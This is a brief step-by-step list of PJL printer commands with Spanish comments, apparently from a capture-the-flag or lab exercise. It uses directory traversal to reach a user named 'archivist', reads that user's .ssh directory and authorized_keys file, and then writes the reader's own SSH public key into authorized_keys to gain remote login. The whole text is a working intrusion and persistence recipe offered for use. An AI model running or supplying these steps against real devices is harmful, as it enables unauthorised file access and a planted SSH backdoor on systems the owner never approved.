# 1. Verificar estructura de directorios
PJL> ls ..
PJL> ls ../..
PJL> ls ../../../home

# 2. Buscar específicamente archivist
PJL> ls ../../../home/archivist

# 3. Verificar si existe .ssh
PJL> query ../../../home/archivist/.ssh

# 4. Listar contenido de .ssh si existe
PJL> ls ../../../home/archivist/.ssh

# 5. Leer authorized_keys existente (si hay)
PJL> cat ../../../home/archivist/.ssh/authorized_keys

# 6. Escribir tu clave pública
PJL> write ../../../home/archivist/.ssh/authorized_keys
ssh-rsa TU_CLAVE_PUBLICA_AQUI usuario@maquina
[Enter]
[Ctrl+D o línea vacía]
